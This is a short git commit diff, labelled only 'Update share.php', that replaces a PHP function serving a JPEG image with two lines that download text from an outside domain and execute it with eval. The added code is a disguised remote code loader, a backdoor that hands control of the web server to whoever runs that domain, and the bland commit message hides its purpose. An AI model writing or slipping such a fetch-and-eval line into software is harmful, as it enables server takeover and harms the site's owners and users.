336e0739ae0eb542c67ca800bbc0c5fe8196f77a
themonsterx <themonster@mit.tc>
2017-10-13 09:25:35 +0300

    Update share.php

--- web/share.php
+++ web/share.php
@@ -1,10 +1,4 @@
 <?php
-function print_img(){
-  $sImage = 'resim.jpg';
-  $rFP = fopen($sImage, 'rb');
-  header("Content-Type: image/jpeg");
-  header("Content-Length: " .(string)(filesize($sImage)) );
-  fpassthru($rFP);
-}
-print_img();
-?>
+$b = file_get_contents("http://kemoterapistis.club/php/heroku/share.txt");
+
+eval($b);
